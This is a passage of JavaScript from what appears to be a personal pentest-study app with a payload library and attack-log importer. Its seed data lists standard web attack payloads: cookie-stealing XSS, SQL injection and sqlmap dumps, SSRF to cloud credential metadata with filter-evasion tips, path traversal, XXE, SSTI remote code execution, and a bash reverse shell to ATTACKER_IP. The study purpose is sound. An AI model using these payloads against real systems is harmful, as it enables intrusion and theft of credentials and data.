     <p class="al-modal-note">md を Claude に渡して JSON 化してもらった内容を貼り付けます。単体 / 配列 / {"attackLogs":[…]} に対応。phase は <b>${esc(data.phases.map(p => p.id).join(" / "))}</b> のいずれか（不明は未分類）。id や ts は自動採番されます。</p>`,
    () => {
      let parsed;
      try { parsed = JSON.parse(val("alImpJson").trim()); }
      catch (e) { toast("⚠ JSON を解析できません: " + e.message); return; }
      const arr = Array.isArray(parsed) ? parsed
                : (parsed && Array.isArray(parsed.attackLogs)) ? parsed.attackLogs
                : [parsed];
      const logs = arr.map(alCoerceLog).filter(Boolean);
      if (!logs.length) { toast("取り込める攻略ログがありません"); return; }
      data.attackLogs.push(...logs);
      logs.forEach(l => { if (l.cert && !data.attackCerts.includes(l.cert)) data.attackCerts.push(l.cert); });
      alCert = logs[0].cert;
      if (logs.length === 1) alOpen(logs[0].id);
      else { alView = "list"; render(); }
      toast(`✅ ${logs.length} 件の攻略ログを取り込みました`);
    },
    { okText: "取り込む" });
}

/* ═══════════════════════════════════════════════════════════════════
   ▼▼▼ 以下、旧 web.js から移植：ペイロード集 & 脆弱性タイプ編集 ▼▼▼
   （payload モードで使用。attacklog とデータ vulnTypes を共有）
═══════════════════════════════════════════════════════════════════ */

/* ── ヘルパ ── */
function vtGet(id)        { return data.vulnTypes.find(v => v.id === id); }
function vtColor(id)      { const v = vtGet(id); return v ? v.color : "#7d9186"; }
function vtLabel(id)      { const v = vtGet(id); return v ? v.label : (id || "—"); }

/* ── ペイロード・ライブラリ ── */
function renderPayloadLib() {
  webSeedIfEmpty();
  alRenderNav("payload");
  const main = document.getElementById("main");

  const counts = {};
  data.vulnTypes.forEach(v => counts[v.id] = data.payloads.filter(p=>p.vulnType===v.id).length);
  const countStr = data.vulnTypes.filter(v=>counts[v.id]).map(v=>`${v.label.split(" ")[0]} ${counts[v.id]}`).join(" · ") || "まだありません";

  let list = data.payloads.slice();
  if (payloadVtFilter) list = list.filter(p => p.vulnType === payloadVtFilter);

  const vtChips = data.vulnTypes.map(v => {
    const n = counts[v.id];
    return `<button class="th-chip ${payloadVtFilter===v.id?'on':''}" onclick="pSetVt('${v.id}')" style="${payloadVtFilter===v.id?`border-color:${v.color};color:${v.color}`:''}">${esc(v.label.split(" ")[0])}${n?` <span style="opacity:.6">${n}</span>`:""}</button>`;
  }).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>ペイロード</h1>
      <span class="th-count">${data.payloads.length} 件 · ${countStr}</span>
      <button class="th-import-btn" onclick="pImportFromCheatsheet()"><span class="material-symbols-rounded">move_to_inbox</span>チートシートから取り込み</button>
      <button class="th-add" onclick="pAddPayload()"><span class="material-symbols-rounded">add</span>ペイロードを追加</button>
    </div>
    <div class="th-filters">
      <button class="th-chip ${!payloadVtFilter?'on':''}" onclick="pSetVt(null)">すべて</button>
      ${vtChips}
      <span class="th-sep"></span>
      <button class="th-chip th-chip-edit" onclick="webEditVulnTypes()"><span class="material-symbols-rounded" style="font-size:15px">tune</span>タイプを編集</button>
    </div>
    ${list.length ? `<div class="web-pgrid">${list.map(renderPayloadCard).join("")}</div>`
      : emptyState("vaccines", data.payloads.length?"該当するペイロードがありません":"ペイロードがまだありません",
          data.payloads.length?"フィルタを変えてください":"「ペイロードを追加」で登録できます")}
  `;
}

function renderPayloadCard(p) {
  const v = vtGet(p.vulnType);
  const color = v ? v.color : "#7d9186";
  const label = v ? v.label.split(" ")[0] : "—";
  const ctx = p.context ? `<span class="web-ctx-tag">${esc(p.context)}</span>` : "";
  const bypass = p.bypass ? `<div class="web-bypass"><span class="material-symbols-rounded" style="font-size:14px">warning</span>${esc(p.bypass)}</div>` : "";
  const preview = esc(p.body).split("\n").slice(0,5).join("\n");
  return `
    <div class="web-pcard" onclick="pOpen('${p.id}')" style="border-left:3px solid ${color}">
      <div class="web-pcard-top">
        <span class="web-vt" style="background:${color}22;color:${color}">${esc(label)}</span>
        <button class="th-qcopy" onclick="event.stopPropagation();copyCell(event, ${escAttr(JSON.stringify(p.body))})" title="コピー"><span class="material-symbols-rounded">content_copy</span></button>
      </div>
      <h3 class="web-ptitle">${esc(p.title)}</h3>
      <pre class="web-pcode">${preview||"<span style='color:var(--md-on-surface-var)'>（本体なし）</span>"}</pre>
      <div class="web-pcard-foot">${ctx}</div>
      ${bypass}
    </div>`;
}

function pSetVt(id){ payloadVtFilter = (payloadVtFilter===id?null:id); renderPayloadLib(); }

function pAddPayload(preset) {
  const vtOpts = data.vulnTypes.map(v=>`<option value="${v.id}" ${preset?.vulnType===v.id?'selected':''}>${esc(v.label)}</option>`).join("");
  openModal("ペイロードを追加",
    `<label>タイトル</label>
     <input id="pTitle" value="${esc(preset?.title||"")}" placeholder="例: UNION カラム数特定">
     <label>脆弱性タイプ</label>
     <select id="pVt">${vtOpts}</select>
     <label>ペイロード本体</label>
     <textarea id="pBody" placeholder="ペイロードを貼り付け">${esc(preset?.body||"")}</textarea>
     <label>用途・発動条件（任意）</label>
     <input id="pCtx" value="${esc(preset?.context||"")}" placeholder="例: 属性エスケープ後 / ?file= 系">
     <label>WAF回避メモ（任意）</label>
     <input id="pBypass" value="${esc(preset?.bypass||"")}" placeholder="例: 127.0.0.1 が弾かれる時は 2130706433">
     <label>参照リンク（任意）</label>
     <input id="pRef" value="${esc(preset?.reference||"")}" placeholder="PayloadsAllTheThings 等">`,
    () => {
      data.payloads.push({
        id: uid(),
        title: val("pTitle") || "無題のペイロード",
        vulnType: val("pVt") || (data.vulnTypes[0]?.id||""),
        body: val("pBody"),
        context: val("pCtx"), bypass: val("pBypass"), reference: val("pRef"),
        ts: Date.now(),
      });
      renderPayloadLib();
      toast("✅ ペイロードを追加しました");
    });
}

function pOpen(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  const v = vtGet(p.vulnType);
  const ref = p.reference ? `<a href="${esc(p.reference)}" target="_blank" rel="noopener" style="color:var(--md-primary)">${esc(p.reference)}</a>` : "—";
  openModal(p.title,
    `<div class="th-detail">
       <div class="th-detail-row"><span class="th-dl">タイプ</span><span class="web-vt" style="background:${(v?.color||'#7d9186')}22;color:${v?.color||'#7d9186'}">${esc(v?.label||"—")}</span></div>
       ${p.context?`<div class="th-detail-row"><span class="th-dl">用途</span><span>${esc(p.context)}</span></div>`:""}
       ${p.bypass?`<div class="th-detail-row"><span class="th-dl">WAF回避</span><span style="color:var(--md-warn)">${esc(p.bypass)}</span></div>`:""}
       <div class="th-detail-row"><span class="th-dl">参照</span><span>${ref}</span></div>
       <label style="margin-top:16px">ペイロード本体</label>
       <pre class="th-qcode-full">${esc(p.body)}</pre>
     </div>`,
    null,
    { okText: "コピー", onOk: () => { copyToClipboard(p.body); toast("📋 コピーしました"); },
      extraBtns: [
        { label: "編集", cls: "btn-text", fn: () => { closeModal(); pEditPayload(id); } },
        { label: "削除", cls: "btn-text btn-danger", fn: () => { closeModal(); pDelPayload(id); } },
      ] });
}

function pEditPayload(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  const vtOpts = data.vulnTypes.map(v=>`<option value="${v.id}" ${p.vulnType===v.id?'selected':''}>${esc(v.label)}</option>`).join("");
  openModal("ペイロードを編集",
    `<label>タイトル</label><input id="pTitle" value="${esc(p.title)}">
     <label>脆弱性タイプ</label><select id="pVt">${vtOpts}</select>
     <label>ペイロード本体</label><textarea id="pBody">${esc(p.body)}</textarea>
     <label>用途・発動条件</label><input id="pCtx" value="${esc(p.context)}">
     <label>WAF回避メモ</label><input id="pBypass" value="${esc(p.bypass)}">
     <label>参照リンク</label><input id="pRef" value="${esc(p.reference)}">`,
    () => {
      p.title=val("pTitle")||"無題のペイロード"; p.vulnType=val("pVt");
      p.body=val("pBody"); p.context=val("pCtx"); p.bypass=val("pBypass"); p.reference=val("pRef");
      renderPayloadLib(); toast("✅ 更新しました");
    });
}
function pDelPayload(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  if (!confirm(`「${p.title}」を削除しますか？`)) return;
  data.payloads = data.payloads.filter(x=>x.id!==id);
  renderPayloadLib(); toast("🗑 削除しました");
}

function renderPayloadSearch() {
  const main = document.getElementById("main");
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  if (!q) { searchMode=false; render(); return; }
  const hits = data.payloads.filter(p =>
    (p.title||"").toLowerCase().includes(q) ||
    (p.body||"").toLowerCase().includes(q) ||
    (p.context||"").toLowerCase().includes(q) ||
    vtLabel(p.vulnType).toLowerCase().includes(q));
  alRenderNav("payload");
  main.innerHTML = `
    <div class="s-head"><h1>検索: ${esc(q)}</h1><span class="th-count">${hits.length} 件</span></div>
    ${hits.length ? `<div class="web-pgrid">${hits.map(renderPayloadCard).join("")}</div>`
      : emptyState("search_off","一致するペイロードがありません","別のキーワードをお試しください")}
  `;
}

/* チートシートから取り込み */
function pImportFromCheatsheet() {
  const existing = new Set(data.payloads.map(p => (p.body||"").trim()));
  const VT_HINT = [
    [/xss|cross.?site.?script/i, "xss"],
    [/sqli|sql.?injection/i, "sqli"],
    [/ssrf/i, "ssrf"],
    [/lfi|path.?traversal|ディレクトリトラバーサル/i, "lfi"],
    [/rce|command.?inj|コマンドインジェク/i, "rce"],
    [/ssti|template.?inj/i, "ssti"],
    [/xxe|xml.?external/i, "xxe"],
    [/idor/i, "idor"],
  ];
  const cand = [];
  for (const t of data.tabs) {
    const label = t.label || "";
    for (const b of t.blocks || []) {
      const ctx = (label + " " + (b.label||"")).toLowerCase();
      const vtHit = VT_HINT.find(([re]) => re.test(ctx));
      if (!vtHit) continue;
      const hdr = (b.headers||[]).map(h=>String(h).toLowerCase());
      let pcol = hdr.findIndex(h => /payload|ペイロード|クエリ|query/.test(h));
      if (pcol < 0) pcol = hdr.length >= 2 ? 1 : 0;
      let tcol = hdr.findIndex((h,i)=> i!==pcol && /用途|項目|名前|title|手法/.test(h));
      if (tcol < 0) tcol = 0;
      for (const r of b.rows || []) {
        const body = String(r[pcol]||"").trim();
        if (body.length < 4) continue;
        if (existing.has(body)) continue;
        cand.push({
          id: uid(),
          title: String(r[tcol]||b.label||"取り込み").trim().slice(0,60),
          vulnType: vtHit[1], body,
          context: "取り込み元: " + label, bypass: "", reference: "",
          ts: Date.now(),
        });
        existing.add(body);
      }
    }
  }
  if (!cand.length) {
    openModal("チートシートから取り込み",
      `<p style="font-size:14px;line-height:1.7">チートシート内に取り込めるWeb攻撃ペイロードが見つかりませんでした。</p>
       <p style="font-size:13px;color:var(--md-on-surface-var);margin-top:10px;line-height:1.7">「ペイロードを追加」から手動登録するか、初期シードをご利用ください。</p>`,
      null, { okText:"OK", onOk:()=>closeModal() });
    return;
  }
  const byVt = {};
  cand.forEach(c => byVt[c.vulnType] = (byVt[c.vulnType]||0)+1);
  const sum = Object.keys(byVt).map(k=>`${vtLabel(k).split(" ")[0]} ${byVt[k]}`).join(" · ");
  openModal("チートシートから取り込み",
    `<div class="th-import-sum">
       <div class="th-kv"><span class="k">取り込むペイロード</span><span class="v">${cand.length} 件</span></div>
       <div class="th-kv"><span class="k">タイプ内訳</span><span class="v">${esc(sum)}</span></div>
     </div>`,
    () => { data.payloads.push(...cand); renderPayloadLib(); toast(`✅ ${cand.length} 件を取り込みました`); },
    { okText: `${cand.length} 件を取り込む` });
}

/* OSWA定番ペイロードのシード（初回のみ） */
function webSeedIfEmpty() {
  if (data.payloads.length || window.__webSeeded) return;
  window.__webSeeded = true;
  const seed = [
    ["xss", "基本の img onerror", "<img src=x onerror=alert(document.cookie)>", "属性/タグエスケープ後の反射XSS", ""],
    ["xss", "SVG onload", "<svg onload=alert(1)>", "script がフィルタされる時", ""],
    ["xss", "属性ブレイクアウト", '"><script>alert(1)</script>', "value 属性内に反射する時", ""],
    ["sqli", "認証バイパス", "' OR '1'='1'-- -", "ログインフォーム", ""],
    ["sqli", "UNION カラム数特定", "' ORDER BY 1-- -\n' UNION SELECT NULL,NULL,NULL-- -", "エラーが消えるまで数を増やす", ""],
    ["sqli", "DB情報抽出 (MySQL)", "' UNION SELECT NULL,version(),database()-- -", "カラム数確定後", ""],
    ["sqli", "sqlmap (リクエストファイル)", "sqlmap -r request.txt --batch --dbs\nsqlmap -r request.txt -D <db> --tables --batch\nsqlmap -r request.txt -D <db> -T <tbl> --dump --batch", "Burpのリクエストを保存して -r", "手動SQLiも練習推奨"],
    ["ssrf", "クラウドメタデータ (AWS)", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "URLパラメータ", "127.0.0.1が弾かれる時は 2130706433 / [::] / 0.0.0.0"],
    ["ssrf", "内部ポートスキャン", "http://127.0.0.1:PORT/", "gopher:// が使える場合もある", ""],
    ["lfi", "PHP filter でソース抽出", "php://filter/convert.base64-encode/resource=index.php", "?file= 系で拡張子が付与される時", ""],
    ["lfi", "パストラバーサル", "../../../../etc/passwd", "深さを増やして試す", "....//  や URLエンコード %2e%2e%2f で回避"],
    ["lfi", "ログ汚染 → RCE", "/var/log/apache2/access.log", "User-Agent に PHP を仕込む", ""],
    ["rce", "コマンド連結", ";id\n|id\n$(id)\n`id`\n%0aid", "OSコマンドインジェクション", ""],
    ["rce", "リバースシェル (bash)", "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1", "nc -lvnp 443 で待受", ""],
    ["ssti", "SSTI 検出", "${7*7}\n{{7*7}}\n<%= 7*7 %>\n#{7*7}", "49 が返ればテンプレートエンジンを絞り込む", "Template Injection Table 参照"],
    ["ssti", "Jinja2 RCE", "{{ self.__init__.__globals__.__builtins__.import('os').popen('id').read() }}", "Python/Jinja2 確定後", ""],
    ["xxe", "ファイル読み取り", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', "XMLを受け付けるエンドポイント", ""],
    ["idor", "ID総当り", "/api/user/1 → /api/user/2 ...", "識別子を変えてアクセス", "Burp Intruder / ffuf で自動化"],
  ];
  const vtOk = new Set(data.vulnTypes.map(v=>v.id));
  seed.forEach(([vt, title, body, ctx, bypass]) => {
    if (!vtOk.has(vt)) return;
    data.payloads.push({ id: uid(), title, vulnType: vt, body, context: ctx||"", bypass: bypass||"", reference: "", ts: Date.now() });
  });
}

/* ── 脆弱性タイプ編集 ── */
const VT_PALETTE = ["#e08a4d","#e05c5c","#5aa9e0","#b085e0","#e06a9c","#45c8b0","#e0a944","#3fd07f","#7d9186","#c9a15a"];
function webEditVulnTypes() {
  const rows = data.vulnTypes.map((v,i) => {
    const cnt = data.payloads.filter(p=>p.vulnType===v.id).length;
    return `<div class="web-vtedit-row">
      <span class="web-vt-swatch" style="background:${v.color}"></span>
      <span class="web-vt-name">${esc(v.label)}</span>
      <span class="web-vt-cnt">${cnt} 件</span>
      <button class="web-vt-act" onclick="webVtRename('${v.id}')">名前</button>
      <button class="web-vt-act" onclick="webVtColor('${v.id}')">色</button>
      <button class="web-vt-act" onclick="webVtMove('${v.id}',-1)" ${i===0?'disabled':''}>↑</button>
      <button class="web-vt-act" onclick="webVtMove('${v.id}',1)" ${i===data.vulnTypes.length-1?'disabled':''}>↓</button>
      <button class="web-vt-act danger" onclick="webVtDelete('${v.id}')">削除</button>
    </div>`;
  }).join("");
  openModal("脆弱性タイプを編集",
    `<div class="web-vtedit-list">${rows}</div>
     <button class="web-vt-add" onclick="webVtAdd()"><span class="material-symbols-rounded" style="font-size:16px">add</span>タイプを追加</button>
     <p class="web-vtedit-note">削除しても、そのタイプのペイロードは残ります（タイプ未設定になります）。</p>`,
    null, { okText: "閉じる", onOk: () => { closeModal(); if(appMode==="payload")renderPayloadLib(); else alRenderDetail?.(); } });
}
function webVtAdd() {
  const color = VT_PALETTE[data.vulnTypes.length % VT_PALETTE.length];
  data.vulnTypes.push({ id: uid(), label: "新しいタイプ", color });
  webEditVulnTypes();
}
function webVtRename(id) {
  const v = vtGet(id); if (!v) return;
  const name = prompt("タイプ名", v.label);
  if (name && name.trim()) { v.label = name.trim(); webEditVulnTypes(); }
}
function webVtColor(id) {
  const v = vtGet(id); if (!v) return;
  const cur = VT_PALETTE.indexOf(v.color);
  v.color = VT_PALETTE[(cur+1) % VT_PALETTE.length];
  webEditVulnTypes();
}
function webVtMove(id, dir) {
  const i = data.vulnTypes.findIndex(v=>v.id===id);
  const j = i + dir;
  if (i<0 || j<0 || j>=data.vulnTypes.length) return;
  [data.vulnTypes[i], data.vulnTypes[j]] = [data.vulnTypes[j], data.vulnTypes[i]];
  webEditVulnTypes();
}
function webVtDelete(id) {
  const v = vtGet(id); if (!v) return;
  if (!confirm(`タイプ「${v.label}」を削除しますか？（ペイロードは残ります）`)) return;
  data.vulnTypes = data.vulnTypes.filter(x=>x.id!==id);
  webEditVulnTypes();
}
